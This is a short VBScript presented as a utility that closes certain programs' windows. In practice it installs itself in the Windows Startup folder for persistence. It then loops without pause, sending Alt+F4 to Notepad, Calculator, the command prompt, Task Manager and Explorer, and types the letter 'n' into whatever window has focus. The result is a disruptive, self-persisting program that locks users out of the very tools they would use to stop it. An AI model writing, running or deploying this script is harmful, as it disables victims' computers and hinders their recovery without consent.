' This script monitors for certain processes and automatically closes their windows
' when they are detected. It also types the letter "n" into the search bar to help 
' prevent the user from reopening the processes.

Set WshShell = WScript.CreateObject("WScript.Shell")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

' Add script to Startup folder
' This ensures that the script runs automatically every time the user logs in.
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

Do
    ' Loop through each process in the list of processes to monitor
    For Each strExeName In strExeNames
        ' Use WMI to get a list of all processes with the given name
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        ' If any processes with the given name are running, close their windows
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 500 ' Wait for window to activate before closing
                WshShell.SendKeys "%{F4}" ' Send Alt+F4 to close window
            Next
        End If
    Next
    
    ' Type "n" into search bar with focus
    ' This helps prevent the user from reopening the closed processes by accident.
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 ' Wait before checking again
Loop
